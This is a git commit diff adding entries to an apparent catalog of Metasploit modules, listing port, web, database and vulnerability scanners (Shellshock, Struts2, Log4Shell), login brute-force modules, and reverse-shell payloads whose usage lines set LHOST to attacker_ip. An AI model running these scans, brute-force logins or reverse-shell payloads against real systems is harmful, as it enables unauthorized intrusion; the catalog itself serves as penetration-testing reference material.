0fb1c2e819997fff8dda39eb485d243605bdf6c6
Your Name <your-email@example.com>
2025-09-18 18:15:51 +0530

    some more module added

--- modules_database.py
+++ modules_database.py
@@ -24,11 +24,51 @@ MODULES_DB = [
         "name": "ACK Port Scanner",
         "path": "auxiliary/scanner/portscan/ack",
         "category": "Port Scanning",
-        "description": "ACK port scanner to identify filtered ports",
+        "description": "ACK port scanner to identify filtered ports and firewall rules",
         "targets": ["Any", "Network"],
         "tags": ["ack", "port", "scan", "firewall", "filtered"],
         "usage": "use auxiliary/scanner/portscan/ack\nset RHOSTS target_ip\nrun",
         "options": ["RHOSTS", "PORTS", "INTERFACE"]
+    },
+    {
+        "name": "XMas Port Scanner",
+        "path": "auxiliary/scanner/portscan/xmas",
+        "category": "Port Scanning",
+        "description": "TCP XMas port scanner (FIN, PSH, URG flags set)",
+        "targets": ["Any", "Network"],
+        "tags": ["xmas", "tcp", "port", "scan", "stealth", "fin", "psh", "urg"],
+        "usage": "use auxiliary/scanner/portscan/xmas\nset RHOSTS target_ip\nset PORTS 1-1000\nrun",
+        "options": ["RHOSTS", "PORTS", "INTERFACE", "SNAPLEN"]
+    },
+    {
+        "name": "FTP Bounce Port Scanner",
+        "path": "auxiliary/scanner/portscan/ftpbounce",
+        "category": "Port Scanning",
+        "description": "FTP bounce port scanner using FTP PORT command",
+        "targets": ["FTP", "Network"],
+        "tags": ["ftp", "bounce", "port", "scan", "proxy"],
+        "usage": "use auxiliary/scanner/portscan/ftpbounce\nset BOUNCEHOST ftp_server\nset RHOSTS target_ip\nrun",
+        "options": ["BOUNCEHOST", "RHOSTS", "BOUNCEPORT", "FTPUSER", "FTPPASS"]
+    },
+    {
+        "name": "NAT-PMP Port Scanner",
+        "path": "auxiliary/scanner/natpmp/natpmp_portscan",
+        "category": "Port Scanning",
+        "description": "NAT-PMP external port scanner for router enumeration",
+        "targets": ["Router", "NAT-PMP", "Network"],
+        "tags": ["natpmp", "router", "port", "scan", "nat", "upnp"],
+        "usage": "use auxiliary/scanner/natpmp/natpmp_portscan\nset RHOSTS router_ip\nrun",
+        "options": ["RHOSTS", "PORTS", "LIFETIME"]
+    },
+    {
+        "name": "SAP Router Port Scanner",
+        "path": "auxiliary/scanner/sap/sap_router_portscanner",
+        "category": "Port Scanning",
+        "description": "SAP Router port scanner for SAP systems",
+        "targets": ["SAP", "Enterprise"],
+        "tags": ["sap", "router", "port", "scan", "enterprise"],
+        "usage": "use auxiliary/scanner/sap/sap_router_portscanner\nset RHOSTS sap_server\nrun",
+        "options": ["RHOSTS", "RPORT", "PORTS"]
     },
     
     # SMB SCANNING MODULES
@@ -259,6 +299,176 @@ MODULES_DB = [
         "options": ["RHOSTS", "RPORT", "TARGETURI", "METHOD"]
     },
     
+    # ADDITIONAL PORT SCANNING MODULES
+    {
+        "name": "WordPress Pingback Scanner",
+        "path": "auxiliary/scanner/http/wordpress_pingback_access",
+        "category": "Web Scanning",
+        "description": "WordPress pingback locator for SSRF attacks",
+        "targets": ["WordPress", "Web"],
+        "tags": ["wordpress", "pingback", "ssrf", "web", "scan"],
+        "usage": "use auxiliary/scanner/http/wordpress_pingback_access\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "TARGETURI", "THREADS"]
+    },
+    {
+        "name": "UDP Port Scanner",
+        "path": "auxiliary/scanner/discovery/udp_sweep",
+        "category": "Port Scanning",
+        "description": "UDP port scanner and service discovery",
+        "targets": ["Any", "Network"],
+        "tags": ["udp", "port", "scan", "discovery", "service"],
+        "usage": "use auxiliary/scanner/discovery/udp_sweep\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "PORTS", "THREADS"]
+    },
+    {
+        "name": "IPv6 Port Scanner",
+        "path": "auxiliary/scanner/portscan/tcp6",
+        "category": "Port Scanning",
+        "description": "IPv6 TCP port scanner",
+        "targets": ["IPv6", "Network"],
+        "tags": ["ipv6", "tcp", "port", "scan"],
+        "usage": "use auxiliary/scanner/portscan/tcp6\nset RHOSTS target_ipv6\nrun",
+        "options": ["RHOSTS", "PORTS", "THREADS"]
+    },
+
+    # ADDITIONAL WEB SCANNING MODULES
+    {
+        "name": "Apache Tomcat Scanner",
+        "path": "auxiliary/scanner/http/tomcat_mgr_login",
+        "category": "Web Scanning",
+        "description": "Apache Tomcat manager login scanner",
+        "targets": ["Tomcat", "Web"],
+        "tags": ["tomcat", "manager", "login", "web", "brute"],
+        "usage": "use auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "USER_FILE", "PASS_FILE"]
+    },
+    {
+        "name": "Jenkins Scanner",
+        "path": "auxiliary/scanner/http/jenkins_enum",
+        "category": "Web Scanning",
+        "description": "Jenkins CI server enumeration",
+        "targets": ["Jenkins", "Web"],
+        "tags": ["jenkins", "ci", "enumeration", "web"],
+        "usage": "use auxiliary/scanner/http/jenkins_enum\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "TARGETURI"]
+    },
+    {
+        "name": "Joomla Scanner",
+        "path": "auxiliary/scanner/http/joomla_version",
+        "category": "Web Scanning",
+        "description": "Joomla CMS version scanner",
+        "targets": ["Joomla", "Web"],
+        "tags": ["joomla", "cms", "version", "web"],
+        "usage": "use auxiliary/scanner/http/joomla_version\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "TARGETURI"]
+    },
+    {
+        "name": "Drupal Scanner",
+        "path": "auxiliary/scanner/http/drupal_views_user_enum",
+        "category": "Web Scanning",
+        "description": "Drupal user enumeration via views",
+        "targets": ["Drupal", "Web"],
+        "tags": ["drupal", "user", "enumeration", "web"],
+        "usage": "use auxiliary/scanner/http/drupal_views_user_enum\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "TARGETURI"]
+    },
+
+    # ADDITIONAL DATABASE MODULES
+    {
+        "name": "PostgreSQL Scanner",
+        "path": "auxiliary/scanner/postgres/postgres_version",
+        "category": "Database Scanning",
+        "description": "PostgreSQL version scanner",
+        "targets": ["PostgreSQL", "Database"],
+        "tags": ["postgresql", "postgres", "database", "version"],
+        "usage": "use auxiliary/scanner/postgres/postgres_version\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "DATABASE"]
+    },
+    {
+        "name": "Oracle Scanner",
+        "path": "auxiliary/scanner/oracle/oracle_login",
+        "category": "Database Scanning",
+        "description": "Oracle database login scanner",
+        "targets": ["Oracle", "Database"],
+        "tags": ["oracle", "database", "login", "brute"],
+        "usage": "use auxiliary/scanner/oracle/oracle_login\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "SID"]
+    },
+    {
+        "name": "MongoDB Scanner",
+        "path": "auxiliary/scanner/mongodb/mongodb_login",
+        "category": "Database Scanning",
+        "description": "MongoDB login scanner",
+        "targets": ["MongoDB", "Database"],
+        "tags": ["mongodb", "database", "login", "nosql"],
+        "usage": "use auxiliary/scanner/mongodb/mongodb_login\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD"]
+    },
+
+    # ADDITIONAL VULNERABILITY SCANNERS
+    {
+        "name": "Shellshock Scanner",
+        "path": "auxiliary/scanner/http/apache_mod_cgi_bash_env",
+        "category": "Vulnerability Scanning",
+        "description": "Shellshock (CVE-2014-6271) vulnerability scanner",
+        "targets": ["Linux", "Apache", "CGI"],
+        "tags": ["shellshock", "bash", "cve-2014-6271", "vulnerability"],
+        "usage": "use auxiliary/scanner/http/apache_mod_cgi_bash_env\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "TARGETURI"]
+    },
+    {
+        "name": "Struts2 Scanner",
+        "path": "auxiliary/scanner/http/struts2_code_exec_scanner",
+        "category": "Vulnerability Scanning",
+        "description": "Apache Struts2 code execution scanner",
+        "targets": ["Struts2", "Java", "Web"],
+        "tags": ["struts2", "java", "code execution", "vulnerability"],
+        "usage": "use auxiliary/scanner/http/struts2_code_exec_scanner\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "TARGETURI"]
+    },
+    {
+        "name": "Log4j Scanner",
+        "path": "auxiliary/scanner/http/log4shell_scanner",
+        "category": "Vulnerability Scanning",
+        "description": "Log4Shell (CVE-2021-44228) vulnerability scanner",
+        "targets": ["Java", "Log4j"],
+        "tags": ["log4shell", "log4j", "cve-2021-44228", "java", "vulnerability"],
+        "usage": "use auxiliary/scanner/http/log4shell_scanner\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "TARGETURI"]
+    },
+
+    # ADDITIONAL NETWORK SERVICES
+    {
+        "name": "Telnet Scanner",
+        "path": "auxiliary/scanner/telnet/telnet_version",
+        "category": "Service Scanning",
+        "description": "Telnet service version scanner",
+        "targets": ["Telnet", "Network"],
+        "tags": ["telnet", "version", "service"],
+        "usage": "use auxiliary/scanner/telnet/telnet_version\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT", "TIMEOUT"]
+    },
+    {
+        "name": "RDP Scanner",
+        "path": "auxiliary/scanner/rdp/rdp_scanner",
+        "category": "Service Scanning",
+        "description": "Remote Desktop Protocol scanner",
+        "targets": ["Windows", "RDP"],
+        "tags": ["rdp", "remote desktop", "windows", "scanner"],
+        "usage": "use auxiliary/scanner/rdp/rdp_scanner\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT"]
+    },
+    {
+        "name": "VNC Scanner",
+        "path": "auxiliary/scanner/vnc/vnc_none_auth",
+        "category": "Service Scanning",
+        "description": "VNC authentication scanner",
+        "targets": ["VNC", "Remote"],
+        "tags": ["vnc", "authentication", "remote", "scanner"],
+        "usage": "use auxiliary/scanner/vnc/vnc_none_auth\nset RHOSTS target_ip\nrun",
+        "options": ["RHOSTS", "RPORT"]
+    },
+
     # PAYLOADS
     {
         "name": "Windows Meterpreter Reverse TCP",
@@ -278,6 +488,26 @@ MODULES_DB = [
         "targets": ["Linux"],
         "tags": ["meterpreter", "linux", "reverse", "tcp", "payload"],
         "usage": "set payload linux/x86/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
+        "options": ["LHOST", "LPORT"]
+    },
+    {
+        "name": "Windows Shell Reverse TCP",
+        "path": "payload/windows/shell/reverse_tcp",
+        "category": "Payloads",
+        "description": "Windows command shell reverse TCP payload",
+        "targets": ["Windows"],
+        "tags": ["shell", "windows", "reverse", "tcp", "payload"],
+        "usage": "set payload windows/shell/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
+        "options": ["LHOST", "LPORT"]
+    },
+    {
+        "name": "PHP Meterpreter Reverse TCP",
+        "path": "payload/php/meterpreter/reverse_tcp",
+        "category": "Payloads",
+        "description": "PHP Meterpreter reverse TCP payload",
+        "targets": ["PHP", "Web"],
+        "tags": ["php", "meterpreter", "reverse", "tcp", "web"],
+        "usage": "set payload php/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
         "options": ["LHOST", "LPORT"]
     }
 ]
